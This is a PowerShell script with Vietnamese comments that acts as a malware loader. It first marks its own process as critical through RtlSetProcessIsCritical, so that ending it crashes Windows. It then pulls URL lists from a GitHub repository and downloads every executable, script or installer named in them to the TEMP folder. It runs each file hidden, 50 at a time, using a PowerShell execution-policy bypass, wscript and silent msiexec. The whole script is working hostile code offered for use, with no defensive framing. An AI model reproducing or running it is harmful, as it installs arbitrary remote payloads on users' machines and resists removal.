function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}
CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
# 1. Cấu hình nguồn list đã check của bạn
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

# Các định dạng hỗ trợ chạy trên Windows
$exts = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"

Write-Host "[*] Dang lay du lieu tu GitHub..." -ForegroundColor Cyan

# 2. Thu thập và Lọc trùng (Fix lỗi Empty Pipe bằng cách dùng biến trung gian)
$raw = foreach ($s in $sources) {
    try { (New-Object System.Net.WebClient).DownloadString($s) -split "`n" } catch { }
}
$urlList = $raw | ForEach-Object { $_.Trim() } | Where-Object { 
    $u = $_
    $u -ne "" -and ($exts | Where-Object { $u.ToLower().EndsWith($_) })
} | Select-Object -Unique

Write-Host "[*] Tim thay $($urlList.Count) link duy nhat. Dang chay 50 luong..." -ForegroundColor Green

# 3. Thiet lap Runspace Pool (50 luong song song)
$iss = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
$pool = [runspacefactory]::CreateRunspacePool(1, 50, $iss, $Host)
$pool.Open()
$jobs = New-Object System.Collections.Generic.List[PSObject]

# 4. Day tac vu vao luong
foreach ($url in $urlList) {
    $ps = [powershell]::Create().AddScript({
        param($u, $extensions)
        try {
            $cleanUrl = $u.Split('?')[0]
            $name = [System.IO.Path]::GetFileName($cleanUrl)
            $path = Join-Path $env:TEMP $name
            $ext = [System.IO.Path]::GetExtension($path).ToLower()

            # Tai file bang WebClient (On dinh hon Invoke-WebRequest)
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($u, $path)

            # Thực thi thông minh theo đuôi file
            if ($ext -eq ".ps1") {
                Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
            }
            elseif (".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $ext) {
                Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden
            }
            elseif ($ext -eq ".msi" -or $ext -eq ".msp") {
                Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden
            }
            else {
                Start-Process -FilePath $path -WindowStyle Hidden
            }
        } catch { }
    }).AddArgument($url).AddArgument($exts)

    $ps.RunspacePool = $pool
    $jobs.Add((New-Object PSObject -Property @{ Instance = $ps; Handle = $ps.BeginInvoke() }))
}

# 5. Cho den khi xong va don dep
while ($jobs.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }

foreach ($j in $jobs) {
    $j.Instance.EndInvoke($j.Handle)
    $j.Instance.Dispose()
}
$pool.Close()

Write-Host "[+] HOAN TAT TAT CA!" -ForegroundColor White
